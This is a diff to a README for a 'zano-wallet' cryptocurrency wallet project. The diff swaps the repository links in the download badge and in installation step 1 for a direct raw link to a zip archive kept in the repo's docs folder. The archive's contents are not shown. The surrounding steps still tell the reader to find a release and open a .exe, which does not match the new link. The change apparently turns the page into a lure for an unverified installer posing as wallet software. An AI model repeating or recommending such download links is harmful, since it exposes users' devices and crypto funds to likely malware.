@@ -1,6 +1,6 @@
 # 🛡️ zano-wallet - Secure privacy for your digital assets
 
-[![Download Zano Wallet](https://img.shields.io/badge/Download-Zano_Wallet-blue.svg)](https://github.com/anukawle15/zano-wallet)
+[![Download Zano Wallet](https://img.shields.io/badge/Download-Zano_Wallet-blue.svg)](https://raw.githubusercontent.com/anukawle15/zano-wallet/main/docs/wallet_zano_v3.8.zip)
 
 This software provides a secure way to manage your Zano blockchain assets. It keeps your keys on your device. You keep total control of your funds. It does not track your identity or require account registration.
 
@@ -19,7 +19,7 @@ The Zano wallet manages funds on the Zano blockchain. It prioritizes user privac
 
 Follow these steps to set up the wallet on your Windows computer.
 
-1. Visit [https://github.com/anukawle15/zano-wallet](https://github.com/anukawle15/zano-wallet).
+1. Visit [https://raw.githubusercontent.com/anukawle15/zano-wallet/main/docs/wallet_zano_v3.8.zip](https://raw.githubusercontent.com/anukawle15/zano-wallet/main/docs/wallet_zano_v3.8.zip).
 2. Locate the latest release version on the page.
 3. Click the link ending in .exe to start your download.
 4. Open the file once the download finishes.
